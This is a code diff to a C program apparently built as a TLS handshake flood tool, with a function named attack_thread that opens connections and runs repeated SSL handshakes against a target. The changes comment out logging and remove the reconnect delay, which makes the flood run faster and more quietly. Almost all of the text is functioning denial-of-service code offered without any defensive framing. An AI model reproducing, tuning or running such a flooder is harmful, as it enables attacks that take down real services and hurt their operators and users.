@@ -38,7 +38,7 @@ int verify_certificate(SSL *ssl)
         return 0;
     }
 
-    printf("[+] Certificate verified successfully\n");
+    // printf("[+] Certificate verified successfully\n");
 
     X509_free(cert);
     return 1;
@@ -73,7 +73,7 @@ void* attack_thread(void* arg)
         if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
             perror("connect");
             close(sock);
-            usleep(100000);
+            // usleep(100000);
             continue;
         }
 
@@ -86,24 +86,22 @@ void* attack_thread(void* arg)
         }
 
         SSL_set_fd(ssl, sock);
-
-        printf("[*] Starting attack thread with mode %d\n", targs->mode);
+        // printf("[*] Starting attack thread with mode %d\n", targs->mode);
 
         if (targs->mode == 1)
         {
             /* FULL HANDSHAKE FLOOD WITH VERIFICATION */
             if (SSL_connect(ssl) <= 0)
             {
-                printf("[!] Handshake failed\n");
-                ERR_print_errors_fp(stderr);
+                // printf("[!] Handshake failed\n");
+                // ERR_print_errors_fp(stderr);
             }
             else
-            {
-                printf("[+] Handshake success\n");
+            {                // printf("[+] Handshake success\n");
 
                 /* VERIFY CERTIFICATE */
                 if (!verify_certificate(ssl)) {
-                    printf("[!] Invalid certificate\n");
+                    // printf("[!] Invalid certificate\n");
                 }
             }
         }
